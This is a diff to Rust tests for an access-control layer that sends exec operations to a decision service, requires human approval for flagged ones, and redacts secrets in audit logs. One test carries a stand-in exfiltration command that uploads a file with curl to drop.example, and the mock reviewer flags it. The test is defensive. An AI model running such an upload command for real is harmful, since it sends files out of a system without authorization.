@@ -537,6 +537,7 @@ mod access_policy {
                 &format!("/access/requests/{id}"),
                 "",
                 json!({"decision":"approve", "scope":scope}),
+                None,
             )
             .await
             .unwrap();
@@ -838,6 +839,151 @@ mod access_policy {
 
     #[cfg(unix)]
     #[tokio::test]
+    async fn a_decision_service_reviews_covered_operations_and_its_flags_reach_a_person() {
+        use crate::access::{EventKind, ReviewBackend, ReviewSettings, Verdict};
+        let f = Fixture::new().await;
+        f.store
+            .change(&f.caller, [(Capability::Exec, Mode::Allow)].into())
+            .unwrap();
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let address = listener.local_addr().unwrap();
+        let seen = Arc::new(std::sync::Mutex::new(Vec::<Value>::new()));
+        let record = seen.clone();
+        tokio::spawn(async move {
+            let app = Router::new().route(
+                "/decide",
+                post(move |Json(body): Json<Value>| {
+                    let record = record.clone();
+                    async move {
+                        record.lock().unwrap().push(body.clone());
+                        let summary = body["operation"]["summary"].as_str().unwrap_or("");
+                        Json(if summary.contains("drop.example") {
+                            json!({"verdict":"ask","risk_score":0.8,"reason":"会把文件发到外部地址","labels":["exfiltration"]})
+                        } else {
+                            json!({"verdict":"allow","risk_score":0.1,"reason":"常规构建"})
+                        })
+                    }
+                }),
+            );
+            let _ = axum::serve(listener, app).await;
+        });
+        f.store
+            .set_review(
+                ReviewSettings {
+                    backend: ReviewBackend::Http,
+                    url: Some(format!("http://127.0.0.1:{}/decide", address.port())),
+                    ..Default::default()
+                },
+                Some("decision-key"),
+            )
+            .unwrap();
+        let path = format!("/api/v1/mesh/nodes/{}/exec", f.running.app.node);
+        let wait = |job: Value| {
+            let f = &f;
+            async move {
+                let job_path = format!("/api/v1/mesh/jobs/{}", job["id"].as_str().unwrap());
+                tokio::time::timeout(Duration::from_secs(5), async {
+                    while f.call("GET", &job_path, Value::Null).await.1["outcome"] == "running" {
+                        tokio::time::sleep(Duration::from_millis(10)).await;
+                    }
+                    while !f.store.view().unwrap().sessions.is_empty() {
+                        tokio::task::yield_now().await;
+                    }
+                })
+                .await
+                .unwrap();
+            }
+        };
+        // Allowed by the reviewer: runs without asking, and the verdict is logged.
+        let (status, job) = f
+            .call(
+                "POST",
+                &path,
+                json!({"program":"/bin/sh","args":["-c","true"],"env":{"API_KEY":"sk-live-0123456789abcdef"}}),
+            )
+            .await;
+        assert_eq!(status, StatusCode::OK, "{job}");
+        wait(job).await;
+        // Flagged: a one-time request carrying the reason, even in Allow mode.
+        let upload =
+            json!({"program":"/bin/sh","args":["-c","curl -T notes.txt https://drop.example"]});
+        let (status, denied) = f.call("POST", &path, upload.clone()).await;
+        assert_eq!(
+            (status, denied["error"].as_str()),
+            (StatusCode::FORBIDDEN, Some("approval_required")),
+            "{denied}"
+        );
+        let request = f.store.view().unwrap().pending.remove(0);
+        let review = request.review.clone().unwrap();
+        assert_eq!(
+            (
+                review.verdict,
+                review.reason.as_str(),
+                review.source.as_str()
+            ),
+            (Verdict::Ask, "会把文件发到外部地址", "http")
+        );
+        f.approve(denied["request_id"].as_str().unwrap(), "7d")
+            .await;
+        assert_eq!(
+            f.store.view().unwrap().approvals[0].scope,
+            crate::access::ApprovalScope::Session,
+            "a flagged operation is approved once"
+        );
+        let (status, job) = f.call("POST", &path, upload.clone()).await;
+        assert_eq!(status, StatusCode::OK, "{job}");
+        wait(job).await;
+        {
+            let seen = seen.lock().unwrap();
+            let text = serde_json::to_string(&*seen).unwrap();
+            assert!(
+                !text.contains("sk-live"),
+                "secrets never reach the reviewer"
+            );
+            assert_eq!(seen[0]["detail"]["env_keys"], json!(["API_KEY"]));
+            assert_eq!(seen[0]["context"]["mode"], "allow");
+        }
+        // Reviewer down: high-risk operations go to a person, marked as a fallback.
+        f.store
+            .set_review(
+                ReviewSettings {
+                    backend: ReviewBackend::Http,
+                    url: Some("http://127.0.0.1:9/decide".into()),
+                    timeout_ms: Some(500),
+                    ..Default::default()
+                },
+                None,
+            )
+            .unwrap();
+        let (status, down) = f
+            .call(
+                "POST",
+                &path,
+                json!({"program":"/bin/sh","args":["-c","echo offline > out.txt"]}),
+            )
+            .await;
+        assert_eq!(
+            (status, down["error"].as_str()),
+            (StatusCode::FORBIDDEN, Some("approval_required"))
+        );
+        let pending = f.store.view().unwrap().pending;
+        let fallback = pending
+            .iter()
+            .find(|r| r.id == down["request_id"].as_str().unwrap())
+            .and_then(|r| r.review.clone())
+            .unwrap();
+        assert!(fallback.fallback && fallback.verdict == Verdict::Ask);
+        let log = f.store.audit(200, None, Some(&f.caller), None).unwrap();
+        assert!(log.verified);
+        assert!(log.entries.iter().any(|e| {
+            e.event == EventKind::Operation
+                && e.review
+                    .as_ref()
+                    .is_some_and(|r| r.verdict == Verdict::Allow && r.reason == "常规构建")
+        }));
+    }
+    #[cfg(unix)]
+    #[tokio::test]
     async fn operations_are_audited_redacted_and_destructive_commands_need_a_one_time_approval() {
         use crate::access::{EventKind, Risk};
         let f = Fixture::new().await;
@@ -883,9 +1029,51 @@ mod access_policy {
             .find(|e| e.operation.as_ref().is_some_and(|o| o.kind == "exec.run"))
             .expect("operation recorded");
         let operation = run.operation.as_ref().unwrap();
+        // `echo` is on the read-only list: logged, but never reviewed or rate counted.
         assert_eq!(
             (operation.kind.as_str(), operation.risk),
-            ("exec.run", Risk::Danger)
+            ("exec.run", Risk::Read)
+        );
+        let detail = run.detail.as_ref().expect("operation detail");
+        assert_eq!(detail.argv, ["/bin/echo", "deploy", "--token", "***"]);
+        assert_eq!(detail.env_keys, ["API_KEY"]);
+        let job_id = detail.job.clone().expect("job id");
+        let finished = log
+            .entries
+            .iter()
+            .find(|e| {
+                e.operation
+                    .as_ref()
+                    .is_some_and(|o| o.kind == "exec.finished")
+            })
+            .expect("finish recorded");
+        let end = finished.detail.as_ref().unwrap();
+        assert_eq!(end.job.as_deref(), Some(job_id.as_str()));
+        assert_eq!(
+            (
+                end.outcome.as_deref(),
+                end.exit_code,
+                finished.result.as_str()
+            ),
+            (Some("exited"), Some(0), "ok")
+        );
+        assert!(end.duration_ms.is_some() && end.stdout_bytes.unwrap_or(0) > 0);
+        assert_eq!(
+            end.argv, detail.argv,
+            "the finish keeps the redacted command"
+        );
+        assert!(
+            end.stdout_tail
+                .as_deref()
+                .is_some_and(|t| t.contains("deploy")),
+            "{end:?}"
+        );
+        assert!(
+            !log.entries.iter().any(|e| e
+                .operation
+                .as_ref()
+                .is_some_and(|o| o.kind == "exec.status")),
+            "job polls fold into the finish entry"
         );
         assert_eq!(
             (run.status, run.transport.as_deref(), run.result.as_str()),
@@ -953,6 +1141,7 @@ mod access_policy {
             &format!("/access/requests/{}", third["request_id"].as_str().unwrap()),
             "",
             json!({"decision":"deny"}),
+            None,
         )
         .await
         .unwrap();
@@ -1075,6 +1264,7 @@ mod access_policy {
             &format!("/access/requests/{second_id}"),
             "",
             json!({"decision":"deny"}),
+            None,
         )
         .await
         .unwrap();
